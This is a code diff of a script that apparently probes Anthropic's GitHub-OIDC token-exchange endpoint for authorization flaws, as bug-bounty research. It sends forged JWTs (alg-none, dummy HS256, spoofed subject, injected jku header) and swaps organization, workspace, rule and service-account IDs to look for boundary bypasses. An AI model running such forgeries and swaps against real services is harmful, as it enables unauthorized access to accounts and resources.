@@ -6,6 +6,7 @@ import { createHash } from "node:crypto";
 const BASE_URL = process.env.ANTHROPIC_BASE_URL || "https://api.anthropic.com";
 const VERSION = process.env.ANTHROPIC_VERSION || "2023-06-01";
 const AUDIENCE = process.env.INPUT_AUDIENCE || "https://api.anthropic.com";
+const EXPERIMENT = process.env.INPUT_EXPERIMENT || "legacy_suite";
 const OUT_DIR = "evidence";
 
 function sha256(value) {
@@ -183,6 +184,160 @@ function requireExchangeVars() {
   return required.filter((name) => !process.env[name]);
 }
 
+function fingerprintExchangeOverrides(overrides = {}) {
+  const keys = ["organization_id", "workspace_id", "federation_rule_id", "service_account_id"];
+  return Object.fromEntries(
+    keys.map((key) => [
+      `${key}_sha256`,
+      typeof overrides[key] === "string" ? sha256(overrides[key]) : null,
+    ]),
+  );
+}
+
+function variantForExperiment(name) {
+  const dummy = {
+    dummy_workspace_id: "wrkspc_01H1DummyWorkspaceBoundaryTest0000",
+    dummy_service_account_id: "svac_01H1DummyServiceAccountTest0000",
+    dummy_federation_rule_id: "fdrl_01H1DummyFederationRuleTest0000",
+    dummy_organization_id: "00000000-0000-4000-8000-000000000001",
+  };
+  const variants = {
+    alt_workspace_id: ["workspace_id", process.env.ANTHROPIC_ALT_WORKSPACE_ID],
+    alt_service_account_id: ["service_account_id", process.env.ANTHROPIC_ALT_SERVICE_ACCOUNT_ID],
+    alt_federation_rule_id: ["federation_rule_id", process.env.ANTHROPIC_ALT_FEDERATION_RULE_ID],
+    alt_organization_id: ["organization_id", process.env.ANTHROPIC_ALT_ORGANIZATION_ID],
+    dummy_workspace_id: ["workspace_id", dummy.dummy_workspace_id],
+    dummy_service_account_id: ["service_account_id", dummy.dummy_service_account_id],
+    dummy_federation_rule_id: ["federation_rule_id", dummy.dummy_federation_rule_id],
+    dummy_organization_id: ["organization_id", dummy.dummy_organization_id],
+  };
+  const selected = variants[name];
+  if (!selected) return null;
+  const [field, value] = selected;
+  if (!value) return { missing: field };
+  return { field, overrides: { [field]: value } };
+}
+
+function classifySelectedExperiment(name, control, variant, safeClaims) {
+  const wrongAudience = AUDIENCE !== "https://api.anthropic.com";
+  const wrongRepo = safeClaims.repository !== "hyunjun12312/h1-anthropic-api-wif-jwt-lab";
+  const wrongRef = safeClaims.ref !== "refs/heads/master";
+  if (wrongAudience) {
+    return control.access_token_returned
+      ? "candidate_high_real_github_oidc_wrong_audience_accepted"
+      : "rejected_real_github_oidc_wrong_audience_blocked";
+  }
+  if (wrongRepo) {
+    return control.access_token_returned
+      ? "candidate_high_real_github_oidc_wrong_repo_accepted"
+      : "rejected_real_github_oidc_wrong_repo_blocked";
+  }
+  if (wrongRef) {
+    return control.access_token_returned
+      ? "candidate_high_real_github_oidc_wrong_ref_accepted"
+      : "rejected_real_github_oidc_wrong_ref_blocked";
+  }
+  if (!control.access_token_returned) return "setup_failed_control_exchange_rejected";
+  if (!variant) return "baseline_control_exchange_accepted";
+  if (!variant.access_token_returned) return `rejected_${name}_blocked`;
+  if (name.includes("service_account")) return "candidate_critical_service_account_selection_bypass";
+  if (name.includes("organization")) return "candidate_critical_cross_org_exchange";
+  if (name.includes("federation_rule")) return "candidate_high_federation_rule_not_bound";
+  if (name.includes("workspace")) return "candidate_high_workspace_boundary_bypass";
+  if (name.includes("replay")) return "candidate_high_jti_replay_accepted";
+  return "candidate_high_boundary_check_accepted";
+}
+
+async function runLegacySuite(evidence, jwt, decoded, safeClaims) {
+  const control = await exchange("control-real-github-oidc-jwt", jwt);
+  evidence.exchange.results.push(control);
+
+  const replay = await exchange("replay-same-real-github-oidc-jwt", jwt);
+  evidence.exchange.results.push(replay);
+
+  if (process.env.ANTHROPIC_ALT_WORKSPACE_ID) {
+    evidence.exchange.results.push(
+      await exchange("workspace-mismatch-alt-workspace-id", jwt, {
+        workspace_id: process.env.ANTHROPIC_ALT_WORKSPACE_ID,
+      }),
+    );
+  }
+
+  if (typeof control._accessTokenForSmokeOnly === "string") {
+    evidence.exchange.message_smoke = await messageSmoke(
+      "control-access-token-message-smoke",
+      control._accessTokenForSmokeOnly,
+    );
+  }
+
+  const mutations = [
+    ["unsigned-alg-none-same-claims", unsignedJwtFrom(decoded)],
+    ["dummy-hs256-same-claims", dummySignedJwtFrom(decoded)],
+    ["unsigned-wrong-audience", unsignedJwtFrom(decoded, { aud: "urn:h1-wrong-audience" })],
+    [
+      "unsigned-wrong-sub",
+      unsignedJwtFrom(decoded, {
+        sub: "repo:attacker/example:ref:refs/heads/main",
+        repository: "attacker/example",
+      }),
+    ],
+    ["unsigned-expired-token", unsignedJwtFrom(decoded, { iat: 1, nbf: 1, exp: 2 })],
+    [
+      "unsigned-jku-header",
+      unsignedJwtFrom(decoded, {}, { jku: "https://example.invalid/.well-known/jwks.json", kid: "h1-jku-test" }),
+    ],
+  ];
+  for (const [label, assertion] of mutations) {
+    evidence.exchange.results.push(await exchange(label, assertion));
+  }
+
+  const acceptedBoundaryBypasses = evidence.exchange.results.filter(
+    (item) => item.label !== "control-real-github-oidc-jwt" && item.access_token_returned,
+  );
+  if (!control.access_token_returned) {
+    evidence.classification = classifySelectedExperiment("legacy_suite", control, null, safeClaims);
+  } else if (acceptedBoundaryBypasses.length) {
+    evidence.classification = "candidate_high_boundary_check_accepted";
+  } else {
+    evidence.classification = "rejected_mutated_jwts_blocked";
+  }
+}
+
+async function runSelectedExperiment(evidence, jwt, safeClaims) {
+  const control = await exchange("control-real-github-oidc-jwt", jwt);
+  evidence.exchange.results.push(control);
+
+  let variant = null;
+  if (EXPERIMENT === "baseline") {
+    // Baseline only: prove the valid GitHub OIDC token can still mint a scoped Anthropic token.
+  } else if (EXPERIMENT === "replay_same_jti") {
+    variant = await exchange("variant-replay-same-real-github-oidc-jwt", jwt);
+    evidence.exchange.results.push(variant);
+  } else {
+    const selected = variantForExperiment(EXPERIMENT);
+    if (!selected) {
+      evidence.classification = `setup_unknown_experiment_${EXPERIMENT}`;
+      return;
+    }
+    if (selected.missing) {
+      evidence.classification = `setup_missing_${selected.missing}_for_${EXPERIMENT}`;
+      return;
+    }
+    evidence.exchange.variant_request_body_fingerprint = fingerprintExchangeOverrides(selected.overrides);
+    variant = await exchange(`variant-${EXPERIMENT}`, jwt, selected.overrides);
+    evidence.exchange.results.push(variant);
+  }
+
+  if (typeof control._accessTokenForSmokeOnly === "string" && EXPERIMENT === "baseline") {
+    evidence.exchange.message_smoke = await messageSmoke(
+      "control-access-token-message-smoke",
+      control._accessTokenForSmokeOnly,
+    );
+  }
+
+  evidence.classification = classifySelectedExperiment(EXPERIMENT, control, variant, safeClaims);
+}
+
 async function main() {
   await mkdir(OUT_DIR, { recursive: true });
   const jwt = await getGithubOidc(AUDIENCE);
@@ -195,10 +350,12 @@ async function main() {
     repository: decoded.payload.repository,
     repository_owner: decoded.payload.repository_owner,
     repository_id: decoded.payload.repository_id,
+    repository_owner_id: decoded.payload.repository_owner_id,
     ref: decoded.payload.ref,
     ref_type: decoded.payload.ref_type,
     sha: decoded.payload.sha,
     workflow: decoded.payload.workflow,
+    workflow_ref: decoded.payload.workflow_ref,
     job_workflow_ref: decoded.payload.job_workflow_ref,
     event_name: decoded.payload.event_name,
     actor: decoded.payload.actor,
@@ -210,8 +367,13 @@ async function main() {
   const evidence = {
     generated_at: new Date().toISOString(),
     scope_asset: "api.anthropic.com / API & SDKs",
-    claim_tested:
-      "GitHub OIDC JWT claim collection and optional Anthropic WIF token-exchange boundary checks.",
+    claim_tested: "GitHub OIDC JWT claim collection and selected Anthropic WIF token-exchange boundary checks.",
+    experiment: {
+      name: EXPERIMENT,
+      one_variable_at_a_time: EXPERIMENT !== "legacy_suite",
+      expected_non_vulnerable: "Only the exact configured GitHub OIDC subject/audience/rule/service-account/workspace/org combination should mint a token.",
+      vulnerable_if: "A token is minted when a request-controlled org/workspace/rule/service_account parameter is swapped away from the configured target.",
+    },
     safety: {
       github_oidc_jwt_not_logged: true,
       github_oidc_jwt_sha256_only: sha256(jwt),
@@ -241,95 +403,10 @@ async function main() {
   if (process.env.RUN_EXCHANGE === "true") {
     if (evidence.exchange.missing_variables.length) {
       evidence.classification = "setup_incomplete_missing_anthropic_wif_variables";
+    } else if (EXPERIMENT === "legacy_suite") {
+      await runLegacySuite(evidence, jwt, decoded, safeClaims);
     } else {
-      const control = await exchange("control-real-github-oidc-jwt", jwt);
-      evidence.exchange.results.push(control);
-
-      // JTI replay check: the exact same GitHub-signed JWT should not normally be
-      // exchangeable twice when the federation issuer has check_jti=true.
-      const replay = await exchange("replay-same-real-github-oidc-jwt", jwt);
-      evidence.exchange.results.push(replay);
-
-      // Workspace boundary check: the rule is configured for Workspace A. If an
-      // alternate Workspace B is supplied as a repo variable, try to swap only the
-      // workspace_id in the exchange body while keeping the same real GitHub JWT,
-      // federation rule, and service account.
-      if (process.env.ANTHROPIC_ALT_WORKSPACE_ID) {
-        evidence.exchange.results.push(
-          await exchange("workspace-mismatch-alt-workspace-id", jwt, {
-            workspace_id: process.env.ANTHROPIC_ALT_WORKSPACE_ID,
-          }),
-        );
-      }
-
-      if (typeof control._accessTokenForSmokeOnly === "string") {
-        evidence.exchange.message_smoke = await messageSmoke(
-          "control-access-token-message-smoke",
-          control._accessTokenForSmokeOnly,
-        );
-      }
-
-      const mutations = [
-        ["unsigned-alg-none-same-claims", unsignedJwtFrom(decoded)],
-        ["dummy-hs256-same-claims", dummySignedJwtFrom(decoded)],
-        [
-          "unsigned-wrong-audience",
-          unsignedJwtFrom(decoded, {
-            aud: "urn:h1-wrong-audience",
-          }),
-        ],
-        [
-          "unsigned-wrong-sub",
-          unsignedJwtFrom(decoded, {
-            sub: "repo:attacker/example:ref:refs/heads/main",
-            repository: "attacker/example",
-          }),
-        ],
-        [
-          "unsigned-expired-token",
-          unsignedJwtFrom(decoded, {
-            iat: 1,
-            nbf: 1,
-            exp: 2,
-          }),
-        ],
-        [
-          "unsigned-jku-header",
-          unsignedJwtFrom(decoded, {}, {
-            jku: "https://example.invalid/.well-known/jwks.json",
-            kid: "h1-jku-test",
-          }),
-        ],
-      ];
-      for (const [label, assertion] of mutations) {
-        evidence.exchange.results.push(await exchange(label, assertion));
-      }
-
-      const acceptedBoundaryBypasses = evidence.exchange.results.filter(
-        (item) => item.label !== "control-real-github-oidc-jwt" && item.access_token_returned,
-      );
-      const requestedUnexpectedAudience = AUDIENCE !== "https://api.anthropic.com";
-      const requestedUnexpectedRepo = safeClaims.repository !== "hyunjun12312/h1-anthropic-api-wif-jwt-lab";
-      const requestedUnexpectedRef = safeClaims.ref !== "refs/heads/master";
-      if (requestedUnexpectedAudience && control.access_token_returned) {
-        evidence.classification = "candidate_high_real_github_oidc_wrong_audience_accepted";
-      } else if (requestedUnexpectedRepo && control.access_token_returned) {
-        evidence.classification = "candidate_high_real_github_oidc_wrong_repo_accepted";
-      } else if (requestedUnexpectedRef && control.access_token_returned) {
-        evidence.classification = "candidate_high_real_github_oidc_wrong_ref_accepted";
-      } else if (requestedUnexpectedAudience && !control.access_token_returned) {
-        evidence.classification = "rejected_real_github_oidc_wrong_audience_blocked";
-      } else if (requestedUnexpectedRepo && !control.access_token_returned) {
-        evidence.classification = "rejected_real_github_oidc_wrong_repo_blocked";
-      } else if (requestedUnexpectedRef && !control.access_token_returned) {
-        evidence.classification = "rejected_real_github_oidc_wrong_ref_blocked";
-      } else if (!control.access_token_returned) {
-        evidence.classification = "setup_failed_control_exchange_rejected";
-      } else if (acceptedBoundaryBypasses.length) {
-        evidence.classification = "candidate_high_boundary_check_accepted";
-      } else {
-        evidence.classification = "rejected_mutated_jwts_blocked";
-      }
+      await runSelectedExperiment(evidence, jwt, safeClaims);
     }
   }
 
@@ -340,11 +417,13 @@ async function main() {
       {
         outPath,
         classification: evidence.classification,
+        experiment: evidence.experiment,
         safe_claims: evidence.github_oidc.safe_claims,
         suggested_rule_condition: evidence.github_oidc.suggested_rule_condition,
         exchange: {
           attempted: evidence.exchange.attempted,
           missing_variables: evidence.exchange.missing_variables,
+          variant_request_body_fingerprint: evidence.exchange.variant_request_body_fingerprint || null,
           summary: evidence.exchange.results.map((item) => ({
             label: item.label,
             status: item.status,
@@ -372,3 +451,4 @@ main().catch((error) => {
   console.error(error instanceof Error ? error.stack || error.message : String(error));
   process.exit(1);
 });
+
